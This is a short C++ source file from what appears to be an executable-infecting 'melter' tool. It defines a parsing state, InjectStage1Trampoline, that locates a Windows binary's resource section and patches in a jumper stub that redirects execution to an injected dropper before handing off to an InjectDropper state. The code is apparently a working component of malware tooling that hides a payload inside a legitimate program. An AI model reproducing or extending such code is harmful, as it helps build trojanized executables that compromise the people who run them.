/*
 * ParseStage1Trampoline.cpp
 *
 *  Created on: May 7, 2010
 *      Author: daniele
 */

#include "Parsing.h"
#include "RCSDropper.h"

void InjectStage1Trampoline::init()
{
	// TODO remove call to jumperStub
	// XXX magic number!!!
	neededBytes() = 32;
	triggeringOffset() = context<StreamingMelter>().currentOffset();
}

StateResult InjectStage1Trampoline::parse()
{
	return PARSED;
}

StateResult InjectStage1Trampoline::process()
{
	char* ptr = context<StreamingMelter>().buffer()->data();

	Dropper& dropper = context<StreamingMelter>().dropper();
	ImageSectionHeader& resourceSection = context<StreamingMelter>().resourceSection();
	offsetToNext() = resourceSection->PointerToRawData;

	if (dropper.size() == 0)
		return PROCESSED;

	DWORD currentVA = context<StreamingMelter>().currentVA();
	DWORD dropperVA = context<StreamingMelter>().dropperVA();
	DBGTRACE_HEX("Jumper stub, destination: ", dropperVA, NOTIFY);
	dropper.patchStage1( ptr, currentVA, dropperVA );

	return PROCESSED;
}

sc::result InjectStage1Trampoline::transitToNext()
{
	return transit< InjectDropper >();
}

InjectStage1Trampoline::InjectStage1Trampoline()
	: DataState< InjectStage1Trampoline, Parsing >()
{
	// TODO Auto-generated constructor stub
}

InjectStage1Trampoline::~InjectStage1Trampoline()
{
	// TODO Auto-generated destructor stub
}
